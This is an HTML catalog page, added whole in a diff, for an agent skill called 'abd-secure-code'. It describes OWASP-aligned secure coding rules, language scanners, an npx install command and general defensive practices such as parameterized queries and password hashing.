@@ -1,0 +1,2021 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AI Garden — skill · abd-secure-code</title>
+<script src="/commons/brand-nav.js?v=aigarden-4"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+
+/*
+  Agile Garden — AI Garden prelude + gardener lesson fragment.
+  Inlined via generate_abd_catalog.py. Max border-radius 6px; flat surfaces.
+  Brand split: orange-500 (#E5531A) for column chrome / rails; ai-blue (#4FC3F7 / #81D4FA)
+  on dense mono skill links — see abd-works-brand BRAND-GUIDELINES §3.1 (ai-blue-500).
+*/
+.catalog-prelude {
+  margin: 0 0 24px;
+  padding: 0 0 20px;
+  border-bottom: 1px solid #2A2A2A;
+}
+.catalog-prelude-heading {
+  margin: 0 0 12px;
+  font-size: 1.2rem;
+  font-weight: 700;
+  color: var(--text);
+  line-height: 1.25;
+  padding-bottom: 8px;
+  border-bottom: 1px solid #2A2A2A;
+  scroll-margin-top: 48px;
+}
+.catalog-prelude-tagline {
+  margin: 0 0 14px;
+  max-width: 60rem;
+  font-size: 1rem;
+  color: var(--muted);
+  line-height: 1.65;
+}
+
+/* Mission row */
+.catalog-mission {
+  margin: 0 0 18px;
+}
+.catalog-mission-card {
+  background: #1B1B20;
+  border: 1px solid #2A2A2A;
+  border-left: 3px solid #E5531A;
+  border-radius: 4px;
+  padding: 14px 20px;
+  display: flex;
+  flex-direction: row;
+  align-items: baseline;
+  gap: 16px;
+}
+.catalog-mission-card h3 {
+  flex-shrink: 0;
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: #F4F4F5;
+  margin: 0;
+  white-space: nowrap;
+}
+.catalog-mission-card p {
+  flex: 1 1 auto;
+  margin: 0;
+  font-size: 0.88rem;
+  color: var(--muted);
+  line-height: 1.55;
+}
+.catalog-mission-card--teal,
+.catalog-mission-card--amber,
+.catalog-mission-card--purple {
+  background: #1B1B20;
+  border: 1px solid #2A2A2A;
+  border-left: 3px solid #E5531A;
+}
+.catalog-mission-card--teal h3,
+.catalog-mission-card--amber h3,
+.catalog-mission-card--purple h3 {
+  color: #F4F4F5;
+}
+@media (max-width: 720px) {
+  .catalog-mission { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+}
+@media (max-width: 480px) {
+  .catalog-mission { grid-template-columns: 1fr; }
+}
+
+/* Two-column skill lists */
+/* ── Section labels (full-width row above each grid) ── */
+.catalog-section-label {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 0 10px;
+  margin: 24px 0 12px;
+  border-bottom: 1px solid #2A2A2A;
+  font-size: 0.72rem;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: #E5531A;
+}
+.catalog-section-label--foundational {
+  margin-top: 28px;
+  color: #8A8A97;
+  border-bottom-color: #1A1A1E;
+}
+
+/* ── Practice grid — all 5 disciplines forced onto one row ── */
+.catalog-practice-grid {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 1px;
+  background: #2A2A2A;
+  border: 1px solid #2A2A2A;
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 0;
+}
+@media (max-width: 900px) {
+  .catalog-practice-grid { grid-template-columns: repeat(3, 1fr); }
+}
+@media (max-width: 600px) {
+  .catalog-practice-grid { grid-template-columns: 1fr; }
+}
+
+/* ── Foundational grid — 2 wider columns ── */
+.catalog-foundational-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 1px;
+  background: #2A2A2A;
+  border: 1px solid #2A2A2A;
+  border-radius: 6px;
+  overflow: hidden;
+}
+@media (max-width: 600px) {
+  .catalog-foundational-grid { grid-template-columns: 1fr; }
+}
+
+/* ── In the practice grid, stack name above desc ── */
+.catalog-practice-grid .catalog-garden-row,
+.catalog-foundational-grid .catalog-garden-row {
+  flex-direction: column;
+  align-items: flex-start;
+  gap: 3px;
+  padding: 10px 16px;
+}
+.catalog-practice-grid .catalog-garden-name,
+.catalog-foundational-grid .catalog-garden-name {
+  flex: none;
+  font-size: 0.85rem;
+}
+.catalog-practice-grid .catalog-garden-desc,
+.catalog-foundational-grid .catalog-garden-desc {
+  display: block !important;
+  font-size: 0.82rem;
+  line-height: 1.5;
+  color: #9B9BA8;
+}
+
+/* ── Agents grid — single wide column ── */
+.catalog-agents-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 1px;
+  background: #2A2A2A;
+  border: 1px solid #2A2A2A;
+  border-radius: 6px;
+  overflow: hidden;
+}
+.catalog-section-label--agents {
+  margin-top: 28px;
+  color: #E5531A;
+  border-bottom-color: #2A2A2A;
+}
+
+/* ── Shared column card ── */
+.catalog-garden-lists {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+.catalog-garden-grid {
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
+  gap: 20px;
+  margin: 0 0 8px;
+}
+@media (max-width: 760px) {
+  .catalog-garden-grid { grid-template-columns: 1fr; }
+}
+.catalog-garden-agents-wrap {
+  margin-top: 8px;
+}
+.catalog-garden-col--agents {
+  margin-top: 0;
+}
+.catalog-garden-col {
+  background: #111113;
+  border: none;
+  border-radius: 0;
+  overflow: hidden;
+}
+.catalog-garden-col-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 16px;
+  font-size: 0.78rem;
+  font-weight: 700;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  border-bottom: 1px solid #2A2A2A;
+  background: #1B1B20;
+  color: #E5531A;
+  border-left: 3px solid #E5531A;
+}
+.catalog-garden-col-header--practice,
+.catalog-garden-col-header--foundational,
+.catalog-garden-col-header--agents {
+  background: #1B1B20;
+  color: #E5531A;
+  border-left: 3px solid #E5531A;
+}
+.catalog-garden-ico { flex-shrink: 0; display: block; }
+.catalog-garden-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 6px 16px;
+  border-bottom: 1px solid #1A1A1E;
+  font-size: 0.85rem;
+}
+.catalog-garden-row:last-child { border-bottom: none; }
+/* Skill/agent links — mono names stay near-white; ai-blue hairline/hover (brand AI accent, not orange wall) */
+.catalog-garden-name {
+  font-weight: 700;
+  font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
+  flex: 0 0 11.5rem;
+  min-width: 0;
+  overflow-wrap: anywhere;
+  word-break: break-word;
+  color: #4FC3F7;
+}
+/* !important beats global `a { … }`, :visited, and concatenation order */
+.catalog-prelude .catalog-garden-name a,
+.catalog-garden-lists .catalog-garden-name a {
+  color: #4FC3F7 !important;
+  font-weight: 700 !important;
+  text-decoration: none !important;
+  border-bottom: 1px solid rgba(79, 195, 247, 0.3);
+}
+.catalog-prelude .catalog-garden-name a:hover,
+.catalog-prelude .catalog-garden-name a:focus-visible,
+.catalog-garden-lists .catalog-garden-name a:hover,
+.catalog-garden-lists .catalog-garden-name a:focus-visible {
+  color: #81D4FA !important;
+  border-bottom-color: rgba(79, 195, 247, 0.95);
+}
+.catalog-garden-name--agent a,
+.catalog-garden-name--foundational a {
+  color: #4FC3F7 !important;
+  border-bottom: 1px solid rgba(79, 195, 247, 0.3);
+}
+.catalog-garden-name--agent a:hover,
+.catalog-garden-name--agent a:focus-visible,
+.catalog-garden-name--foundational a:hover,
+.catalog-garden-name--foundational a:focus-visible {
+  color: #81D4FA !important;
+  border-bottom-color: rgba(79, 195, 247, 0.92);
+}
+.catalog-garden-name--dim {
+  color: var(--muted);
+  opacity: 0.6;
+  font-weight: 600;
+  font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
+}
+.catalog-garden-desc {
+  color: var(--muted);
+  font-size: 0.82rem;
+  flex: 1 1 auto;
+  min-width: 0;
+}
+.catalog-garden-desc--muted { opacity: 0.5; }
+
+:root {
+  /* Primary accent — borders, nav “you are here”; keep saturated */
+  --orange:       #E5531A;
+  --orange-hover: #C64514;
+  /* Brand ai-blue (BRAND-GUIDELINES §3.1) — dense skill listings + card hover cue */
+  --ai-blue-500:  #4FC3F7;
+  --ai-blue-300:  #81D4FA;
+  /* Body links — soft orange (prose); garden grid uses ai-blue in agile-garden-fragment.css */
+  --link-soft:        #FFB380;
+  --link-soft-hover:  #FFCCA3;
+  --link-muted:       #F2A07A;
+  --bg:           #0B0B0B;
+  --surface:      #111113;
+  --raised:       #1B1B20;
+  --border:       #2A2A2A;
+  --border-muted: #1e1e22;
+  --text:         #F4F4F5;
+  --muted:        #9B9BA8;
+  --radius:       6px;
+  --font-sans:    'Inter', system-ui, sans-serif;
+  --font-mono:    'JetBrains Mono', ui-monospace, monospace;
+}
+*, *::before, *::after { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  margin: 0;
+  font-family: var(--font-sans);
+  font-size: 15px;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: var(--link-muted); text-decoration: none; transition: color 120ms ease; }
+a:hover { color: var(--link-soft-hover); text-decoration: none; }
+
+/* Wayfinding stays strong accent */
+.nav a.nav__link--current {
+  color: var(--orange) !important;
+}
+strong { font-weight: 600; }
+code {
+  font-family: var(--font-mono);
+  font-size: 0.875em;
+  background: rgba(255,255,255,0.06);
+  padding: 2px 5px;
+  border-radius: 3px;
+  color: #F2A07A;
+}
+
+/* ── Page layout ── */
+.page-wrap {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 48px clamp(16px, 4vw, 48px) 96px;
+}
+
+/* ── Panel / legacy wrapper — flatten to plain surface ── */
+.panel {
+  background: transparent;
+  border: none;
+  border-radius: 0;
+  overflow: visible;
+}
+
+/* ── Page header (replaces old panel-header) ── */
+.panel-header {
+  margin-bottom: 40px;
+  padding-bottom: 32px;
+  border-bottom: 1px solid var(--border);
+  border-left: none;
+  background: transparent;
+  display: block;
+}
+
+.header-icon { display: none; }
+
+.header-text { display: block; }
+.brand { display: none; }
+.brand-row { display: none; }
+.brand-row .brand { display: none; }
+.brand-row .cap-badge { display: none; }
+
+h1 {
+  margin: 0 0 10px;
+  font-size: clamp(28px, 4vw, 42px);
+  font-weight: 800;
+  letter-spacing: -0.03em;
+  line-height: 1.1;
+  color: var(--text);
+  font-family: var(--font-sans);
+}
+
+.tagline {
+  margin: 0;
+  font-size: 15px;
+  color: var(--muted);
+  max-width: 540px;
+  line-height: 1.65;
+  font-family: var(--font-sans);
+}
+
+.panel-body { padding: 0; }
+p { margin: 0 0 14px; }
+h2 {
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin: 32px 0 14px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+  color: var(--text);
+}
+h2:first-child { margin-top: 0; }
+.nav {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px 18px;
+  margin: 0 0 18px;
+  padding: 0 0 14px;
+  border-bottom: 1px solid var(--border-muted);
+}
+.nav a {
+  font-size: 0.95rem;
+  font-weight: 600;
+  color: var(--muted);
+}
+.nav a.nav__link--current {
+  pointer-events: none;
+}
+/* Kanban is a different experience (full-screen deck) — keep it last and visually apart */
+.nav a.nav__link--kanban {
+  margin-left: auto;
+  padding-left: 18px;
+  border-left: 1px solid var(--border-muted);
+}
+.cap-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 14px;
+  margin: 18px 0 0;
+}
+.cap-card {
+  display: block;
+  text-decoration: none;
+  background: var(--raised);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--orange);
+  border-radius: var(--radius);
+  padding: 16px 18px;
+  transition: background 0.15s, border-color 0.15s;
+  cursor: pointer;
+}
+a.cap-card {
+  color: var(--muted);
+}
+.cap-card:hover {
+  background: rgba(79, 195, 247, 0.06);
+  border-color: rgba(79, 195, 247, 0.32);
+  text-decoration: none;
+}
+.cap-card__title {
+  font-size: 0.97rem;
+  font-weight: 700;
+  color: #F4F4F5;
+  margin: 0 0 12px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+a.cap-card:hover .cap-card__title {
+  color: var(--ai-blue-300);
+}
+.cap-card__icon {
+  flex-shrink: 0;
+  width: 24px;
+  height: 24px;
+  color: rgba(79, 195, 247, 0.72);
+}
+a.cap-card:hover .cap-card__icon {
+  color: var(--ai-blue-500);
+}
+.cap-card__label {
+  font-size: 0.72rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  opacity: 0.55;
+  margin-bottom: 1px;
+}
+.cap-card__summary { font-size: 0.85rem; color: var(--muted); line-height: 1.45; margin: 0 0 8px; }
+.cap-card__meta { font-size: 0.75rem; color: var(--muted); font-family: var(--font-mono, 'JetBrains Mono', monospace); margin: 0 0 8px; opacity: 0.85; }
+.cap-card__more {
+  font-size: 0.78rem;
+  color: rgba(79, 195, 247, 0.82);
+  opacity: 1;
+  margin: 10px 0 0;
+}
+
+/* Entry detail pages (skill/*.html, agent/*.html) — overview-style */
+.entry-detail-header .back-link {
+  font-size: 0.82rem;
+  color: var(--muted);
+  display: inline-block;
+  margin: 0 0 10px;
+}
+.entry-detail-header .back-link:hover {
+  color: var(--orange);
+}
+.cap-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--orange);
+  background: rgba(255, 122, 0, 0.08);
+  border: 1px solid rgba(255, 122, 0, 0.25);
+  border-radius: 3px;
+  padding: 2px 8px;
+  margin: 0 0 8px;
+}
+.entry-caption {
+  font-size: 0.9rem;
+  color: var(--muted);
+  margin: 0 0 12px;
+}
+.entry-prose {
+  white-space: pre-wrap;
+  color: var(--text);
+  line-height: 1.65;
+  margin: 0 0 8px;
+  font-size: 0.95rem;
+}
+.entry-divider {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 26px 0;
+}
+.entry-contents-doc {
+  margin: 0 0 8px;
+}
+.entry-contents-files {
+  margin: 0;
+}
+.entry-md-section {
+  border: 1px solid var(--border-muted);
+  border-radius: var(--radius);
+  margin: 0 0 10px;
+  background: rgba(0, 0, 0, 0.14);
+}
+.entry-md-section > summary.entry-md-section__summary {
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 0.98rem;
+  padding: 12px 14px;
+  list-style: none;
+  color: var(--text);
+  user-select: none;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+.entry-md-section > summary.entry-md-section__summary::before {
+  content: "+";
+  flex-shrink: 0;
+  width: 1.35em;
+  text-align: center;
+  font-weight: 800;
+  font-size: 1.05em;
+  line-height: 1.35;
+  color: var(--orange);
+}
+.entry-md-section[open] > summary.entry-md-section__summary::before {
+  content: "-";
+}
+.entry-md-section > summary.entry-md-section__summary::-webkit-details-marker {
+  display: none;
+}
+.entry-md-section .entry-md-section__body {
+  padding: 0 14px 14px 16px;
+  border-top: 1px solid var(--border-muted);
+  font-size: 0.95rem;
+  line-height: 1.65;
+  color: var(--text);
+}
+.entry-md-section .entry-md-section__body p {
+  margin: 0 0 12px;
+}
+.entry-md-section .entry-md-section__body p:last-child {
+  margin-bottom: 0;
+}
+.entry-md-section .entry-md-section__body ul {
+  margin: 0 0 12px;
+  padding-left: 1.35rem;
+}
+.entry-md-section .entry-md-section__body h2 {
+  font-size: 1.05rem;
+  font-weight: 700;
+  margin: 18px 0 8px;
+  padding-bottom: 0;
+  border-bottom: none;
+  color: var(--text);
+}
+.entry-md-section .entry-md-section__body h3 {
+  font-size: 1rem;
+  font-weight: 700;
+  margin: 14px 0 8px;
+  color: var(--text);
+}
+.entry-md-section .entry-md-section__body pre {
+  margin: 0 0 12px;
+  overflow-x: auto;
+}
+.entry-md-section .entry-md-section__body hr {
+  margin: 14px 0;
+  border: none;
+  border-top: 1px solid var(--border-muted);
+}
+.ascii-diagram {
+  background: #111114;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 14px 16px;
+  overflow-x: auto;
+  font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
+  font-size: 0.83em;
+  line-height: 1.55;
+  color: #b8b8c2;
+  margin: 0 0 18px;
+}
+.install-block {
+  margin: 22px 0 0;
+  padding: 16px 18px;
+  background: rgba(0, 0, 0, 0.2);
+  border: 1px solid var(--border-muted);
+  border-radius: var(--radius);
+  border-left: 3px solid var(--orange);
+}
+.install-block h2 {
+  margin-top: 0;
+  border-bottom: none;
+  padding-bottom: 0;
+}
+.install-block .install-hint {
+  font-size: 0.92rem;
+  color: var(--muted);
+  margin: 0 0 12px;
+}
+.install-snippet {
+  background: #111114;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 14px 16px;
+  overflow-x: auto;
+  margin: 0;
+  font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
+  font-size: 0.85em;
+  line-height: 1.5;
+  color: #d4d4d4;
+}
+.install-snippet code {
+  background: transparent;
+  padding: 0;
+  font-size: inherit;
+  color: inherit;
+}
+.file-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+.file-list li {
+  margin: 0 0 14px;
+  padding: 10px 12px 10px 14px;
+  border-left: 3px solid var(--border-muted);
+  background: rgba(0, 0, 0, 0.15);
+  border-radius: 0 4px 4px 0;
+}
+.file-list .file-meta {
+  color: var(--muted);
+  font-size: 0.9rem;
+  display: block;
+  margin-top: 4px;
+}
+.file-list a {
+  font-weight: 600;
+}
+.file-list--root {
+  margin-top: 4px;
+}
+.file-list--nested {
+  margin: 8px 0 0 0;
+  padding-left: 0;
+  border-left: 2px solid var(--border-muted);
+  margin-left: 2px;
+  padding-left: 10px;
+}
+.file-list--nested li {
+  margin-bottom: 10px;
+  padding: 8px 10px 8px 12px;
+  font-size: 0.95rem;
+}
+.file-list__nested-note {
+  margin: 8px 0 0 0;
+  padding: 6px 0 4px 4px;
+  color: var(--muted);
+  font-size: 0.9rem;
+}
+/* Expandable folder tree (<details> / <summary>) */
+.file-list > li.file-list__folder {
+  list-style: none;
+  padding: 0;
+  margin: 0 0 10px;
+  border: none;
+  background: transparent;
+  border-radius: 0;
+}
+.file-list__folder > .file-tree__details {
+  margin: 0 0 10px 0;
+}
+/* Match .entry-md-section: folder trees (rules, scanners, templates, …) */
+.file-tree__details {
+  border: 1px solid var(--border-muted);
+  border-radius: var(--radius);
+  background: rgba(0, 0, 0, 0.14);
+  overflow: hidden;
+}
+.file-tree__summary {
+  cursor: pointer;
+  padding: 12px 14px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  list-style: none;
+  margin: 0;
+  font-weight: 600;
+  font-size: 0.98rem;
+  color: var(--text);
+  user-select: none;
+  background: transparent;
+}
+.file-tree__summary::-webkit-details-marker {
+  display: none;
+}
+.file-tree__summary::marker {
+  content: "";
+  display: none;
+}
+.file-tree__summary::before {
+  content: "+";
+  flex-shrink: 0;
+  width: 1.35em;
+  text-align: center;
+  font-weight: 800;
+  font-size: 1.05em;
+  line-height: 1.35;
+  color: var(--orange);
+}
+.file-tree__details[open] > .file-tree__summary::before {
+  content: "-";
+}
+.file-tree__summary:hover {
+  background: rgba(255, 122, 0, 0.06);
+}
+.file-tree__summary .file-meta {
+  display: inline;
+  margin-left: 6px;
+  font-size: 0.9rem;
+  color: var(--muted);
+}
+.file-tree__inner {
+  padding: 0 14px 14px 16px;
+  border-top: 1px solid var(--border-muted);
+}
+.file-tree__ul {
+  margin-top: 4px;
+}
+.file-tree__dir > .file-tree__details {
+  margin: 0;
+  border-radius: 4px;
+}
+.file-tree__dir--truncated {
+  font-size: 0.95rem;
+}
+.file-tree__file .file-meta {
+  display: block;
+  margin-top: 4px;
+}
+
+/* Agile Garden prelude + mission + lists: abd-works/commons/agile-garden-fragment.css (prepended by generate_abd_catalog.py) */
+
+/* Single-page hub (index.html): collapsible hub / skills / agents */
+.catalog-section {
+  border: 1px solid var(--border-muted);
+  border-radius: 8px;
+  margin: 0 0 16px;
+  background: rgba(0, 0, 0, 0.18);
+  overflow: hidden;
+}
+.catalog-section > summary {
+  cursor: pointer;
+  list-style: none;
+  padding: 14px 16px;
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: var(--text);
+  background: rgba(255, 255, 255, 0.04);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  user-select: none;
+}
+.catalog-section > summary::-webkit-details-marker { display: none; }
+.catalog-section > summary::marker { content: ""; }
+.catalog-section > summary::before {
+  content: "+";
+  flex-shrink: 0;
+  width: 1.5rem;
+  height: 1.5rem;
+  line-height: 1.45rem;
+  text-align: center;
+  font-weight: 700;
+  font-size: 0.95rem;
+  border: 1px solid var(--border-muted);
+  border-radius: 4px;
+  background: rgba(255, 255, 255, 0.1);
+}
+.catalog-section[open] > summary::before { content: "\2212"; }
+.catalog-section[open] > summary {
+  border-bottom: 1px solid var(--border-muted);
+}
+.catalog-section .section-body {
+  padding: 18px 16px 22px;
+}
+.catalog-section .section-body > p:first-of-type { margin-top: 0; }
+.catalog-section .cap-grid { margin-top: 8px; }
+.catalog-section .count {
+  font-size: 0.85rem;
+  font-weight: 600;
+  color: var(--muted);
+}
+
+/* Static markdown mirror pages (catalog/doc/...) */
+.rule-prose {
+  font-size: 1rem;
+  line-height: 1.65;
+  max-width: 52rem;
+}
+.rule-prose h1,
+.rule-prose h2,
+.rule-prose h3,
+.rule-prose h4 {
+  margin: 1.25em 0 0.5em;
+  font-weight: 700;
+  line-height: 1.25;
+  color: var(--text);
+}
+.rule-prose h1:first-child,
+.rule-prose h2:first-child,
+.rule-prose h3:first-child {
+  margin-top: 0;
+}
+.rule-prose h1 { font-size: 1.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+.rule-prose h2 { font-size: 1.25rem; border-bottom: 1px solid var(--border-muted); padding-bottom: 0.25em; }
+.rule-prose h3 { font-size: 1.1rem; }
+.rule-prose p { margin: 0 0 12px; }
+.rule-prose pre {
+  margin: 12px 0;
+  padding: 12px 14px;
+  overflow: auto;
+  background: #1f1f24;
+  border: 1px solid var(--border-muted);
+  border-radius: 6px;
+  font-size: 0.88em;
+  line-height: 1.45;
+}
+.rule-prose code { font-size: inherit; }
+.rule-prose ul,
+.rule-prose ol {
+  margin: 8px 0 12px 1.25rem;
+  padding: 0;
+}
+.rule-prose li { margin-bottom: 6px; }
+.rule-prose strong { color: var(--text); }
+.rule-prose hr {
+  border: 0;
+  border-top: 1px solid var(--border-muted);
+  margin: 1.25em 0;
+}
+.rule-prose .md-table-wrap {
+  overflow-x: auto;
+  margin: 12px 0 16px;
+  -webkit-overflow-scrolling: touch;
+}
+.rule-prose table.md-table {
+  width: max-content;
+  max-width: 100%;
+  border-collapse: collapse;
+  font-size: 0.9rem;
+  line-height: 1.4;
+}
+.rule-prose table.md-table th,
+.rule-prose table.md-table td {
+  border: 1px solid var(--border-muted);
+  padding: 8px 10px;
+  text-align: left;
+  vertical-align: top;
+}
+.rule-prose table.md-table th {
+  background: rgba(255, 122, 0, 0.08);
+  font-weight: 600;
+  white-space: nowrap;
+}
+.rule-prose table.md-table td { background: var(--panel); }
+.rule-prose a { color: var(--accent, #ff7a00); text-decoration: underline; }
+.rule-prose a:hover { text-decoration: none; }
+
+.plugin-slots h3 {
+  margin: 28px 0 8px;
+  font-size: 1.05rem;
+}
+.plugin-slots h3:first-child { margin-top: 0; }
+.cap-grid--plugin-slot { margin-bottom: 8px; }
+
+</style>
+</head>
+<body>
+<div class="page-wrap">
+<div class="panel" role="main">
+
+<header class="panel-header entry-detail-header">
+  <div class="header-text">
+    <div class="brand-row">
+      <p class="brand"><strong>abd.works</strong> &middot; AI Garden</p>
+      <p class="cap-badge">Skill</p>
+    </div>
+    <a class="back-link" href="../skills.html">← All skills</a>
+    <h1>abd-secure-code</h1>
+    <p class="tagline">OWASP-aligned secure coding rules and Python/Java/JavaScript scanners — write and prove security-sensitive production code before merge.</p>
+  </div>
+</header>
+
+<div class="panel-body">
+
+<nav class="nav" aria-label="AI Garden sections">
+  <a href="../index.html" class="nav__link">Complete</a>
+  <a href="../skills.html" class="nav__link nav__link--current">Skills</a>
+  <a href="../agents.html" class="nav__link">Agents</a>
+  <a href="../instructions.html" class="nav__link">Instructions</a>
+  <a href="../kanban-layout/index.html" class="nav__link nav__link--kanban">Delivery kanban</a>
+</nav>
+
+<h2>Description</h2>
+<div class="entry-prose"><p>Packages Secure Code Warrior guidance into <strong>24 checkable rules</strong> and <strong>72 language scanners</strong> (Python, Java, JavaScript). Use alongside <strong>abd-clean-code</strong> during the GREEN phase or on security-focused slices (auth, persistence, file handling, crypto, rendered output).</p>
+<p>Training corpus and regression fixtures remain in the sibling <strong>`secure-code-warrior`</strong> repository (<code>context/</code>, <code>fixtures/</code>). Configure <code>inputs/corpus-root.json</code> if your checkout path differs.</p></div>
+
+<section class="install-block" aria-labelledby="install-npx-heading">
+  <h2 id="install-npx-heading">Install with npx</h2>
+  <p class="install-hint">Install this package from GitHub into your project or global agent skills directory (see <a href="https://skills.sh/">skills.sh</a> / Open Agent Skills).</p>
+  <pre class="install-snippet"><code>npx skills add agilebydesign/agilebydesign-skills@abd-secure-code -y</code></pre>
+</section>
+
+
+<hr class="entry-divider">
+
+<h2>How it fits together</h2>
+<pre class="ascii-diagram" role="img" aria-label="How it fits together">story / AC / failing test
+           |
+           v
+  rules (OWASP themes) -----&gt; secure production code
+           |
+           v
+  scanners (py / java / js) -&gt; scanner-report/abd-secure-code.md
+           |
+           v
+  secure-code-review-checklist.md</pre>
+
+
+<hr class="entry-divider">
+
+<h2 id="entry-contents">Contents</h2>
+<div class="entry-contents-doc">
+<details class="entry-md-section" id="purpose"><summary class="entry-md-section__summary">Purpose</summary><div class="entry-md-section__body"><p>Engineers ship features faster than attackers find gaps — but only when secure defaults are explicit, reviewable, and mechanically checkable. This skill packages Secure Code Warrior guidance into concrete coding rules and automated scanners so teams and agents can <strong>write</strong> security-sensitive code and <strong>prove</strong> it meets the same bar before merge.</p></div></details>
+<details class="entry-md-section" id="when-to-use-this-skill"><summary class="entry-md-section__summary">When to use this skill</summary><div class="entry-md-section__body"><ul>
+<li>You are <strong>implementing</strong> authentication, persistence, file handling, crypto, or user-rendered content.</li>
+<li>You are in the <strong>GREEN</strong> phase after acceptance tests and need production code that passes secure-code scanners.</li>
+<li>You are <strong>reviewing</strong> a pull request for OWASP Top 10 categories covered by this package.</li>
+<li>An agent is asked to &quot;make this secure&quot;, &quot;fix SQL injection&quot;, &quot;hash passwords correctly&quot;, or &quot;run secure code scanners&quot;.</li>
+</ul></div></details>
+<details class="entry-md-section" id="core-concepts"><summary class="entry-md-section__summary">Core concepts</summary><div class="entry-md-section__body"><h3>Threat-informed defaults</h3>
+<p>Each rule maps to a <strong>real failure mode</strong> from the Secure Code Warrior corpus (injection, cryptographic failure, unsafe deserialization, mass assignment, information disclosure). Secure code is not a separate checklist bolted on at the end — it is how you handle <strong>untrusted input</strong>, <strong>secrets</strong>, <strong>errors</strong>, and <strong>output encoding</strong> in normal production modules.</p>
+<h3>Parameterized data access</h3>
+<p>Databases, shells, and HTML parsers must receive <strong>data as data</strong>. SQL uses bound parameters; shell invocation uses argument arrays; browser output uses escaping or sanitization. Concatenating or interpolating untrusted strings into executable contexts is the common root of injection flaws.</p>
+<h3>Secrets and verifiers</h3>
+<p><strong>Secrets</strong> (API keys, private keys) never belong in source control. <strong>Passwords</strong> are one-way verifiers — store adaptive hashes with salts, not plaintext or reversible encryption. <strong>Tokens</strong> and session identifiers require cryptographically secure randomness.</p>
+<h3>Fail safe to users, verbose to logs</h3>
+<p>Clients see generic errors with a correlation id. Operators and incident response see stack traces, query errors, and security events in protected logs — not in HTTP responses.</p>
+<h3>Rules and scanners</h3>
+<p><strong>`rules/*.md`</strong> state pass/fail conditions grounded in <strong>`context/`</strong> sources (cheat sheets, exercises, green belt challenges). <strong>`scanners/python/`</strong>, <strong>`scanners/java/`</strong>, and <strong>`scanners/javascript/`</strong> enforce the same rule stems mechanically (AST or pattern checks). Run every language folder that matches files in the engagement workspace.</p>
+<h3>Language stacks</h3>
+<div class="md-table-wrap"><table class="md-table"><thead><tr><th>Stack</th><th>Scanner folder</th><th>Typical paths</th></tr></thead><tbody><tr><td>Python (Flask, Django, FastAPI)</td><td>`scanners/python/`</td><td>`src/`, `server/`, `app/`</td></tr><tr><td>Java (Spring, Jakarta EE, JDBC)</td><td>`scanners/java/`</td><td>`src/main/java/`, `server/`</td></tr><tr><td>Node.js / Express / Nest</td><td>`scanners/javascript/`</td><td>`server/`, `packages/*/src/`</td></tr><tr><td>Browser / React / Vue / Angular</td><td>`scanners/javascript/`</td><td>`client/`, `src/` (XSS, eval, secrets)</td></tr></tbody></table></div>
+<hr></div></details>
+<details class="entry-md-section" id="agent-instructions"><summary class="entry-md-section__summary">Agent Instructions</summary><div class="entry-md-section__body"><p>1. <strong>Confirm language</strong> — Python, Java, JavaScript/TypeScript (Node or browser), or any combination. Default: detect from changed files under `packages/`, `src/`, `server/`, `client/`, `src/main/java/`. 2. <strong>Read rules before coding</strong> — Open every `rules/<em>.md` relevant to the story (auth → password + secrets; forms → mass assignment + XSS; DB → SQL). 3. </em><em>Implement with secure defaults</em><em> — Parameterized queries, hashed passwords, allow-listed updates, sanitized HTML, generic error responses. 4. </em><em>Run scanners</em><em> — `run_scanners.py` once per language (`python`, `java`, `javascript`) against the engagement workspace. 5. </em><em>Fill checklist</em><em> — Copy `templates/secure-code-review-checklist.md` for the slice; mark pass/fail per rule. 6. </em><em>Re-bundle after rule edits</em>* — From agilebydesign-skills repo: `bundle_rules_into_skill_md.py --skill-root &lt;this skill&gt;`.</p>
+<hr></div></details>
